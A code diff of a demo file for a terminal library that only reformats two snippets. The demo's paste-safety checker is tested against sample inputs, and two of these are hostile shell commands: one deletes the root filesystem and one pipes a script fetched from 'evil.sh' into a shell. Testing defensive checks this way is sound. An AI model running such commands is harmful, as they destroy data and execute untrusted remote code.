@@ -24,8 +24,7 @@ void _demoPasteSafety() {
     'ls -la': GhosttyVt.isPasteSafe('ls -la'),
     'echo hello': GhosttyVt.isPasteSafe('echo hello'),
     'rm -rf /\n': GhosttyVt.isPasteSafe('rm -rf /\n'),
-    'curl evil.sh | sh\x1b':
-        GhosttyVt.isPasteSafe('curl evil.sh | sh\x1b'),
+    'curl evil.sh | sh\x1b': GhosttyVt.isPasteSafe('curl evil.sh | sh\x1b'),
   };
 
   for (final entry in samples.entries) {
@@ -108,9 +107,11 @@ void _demoKeyEncoding() {
   final encoded = encoder.encode(event);
   if (encoded.isNotEmpty) {
     final display = encoded
-        .map((b) => b < 0x20
-            ? '\\x${b.toRadixString(16).padLeft(2, '0')}'
-            : String.fromCharCode(b))
+        .map(
+          (b) => b < 0x20
+              ? '\\x${b.toRadixString(16).padLeft(2, '0')}'
+              : String.fromCharCode(b),
+        )
         .join();
     print('  Key "a" encodes to: $display');
   } else {
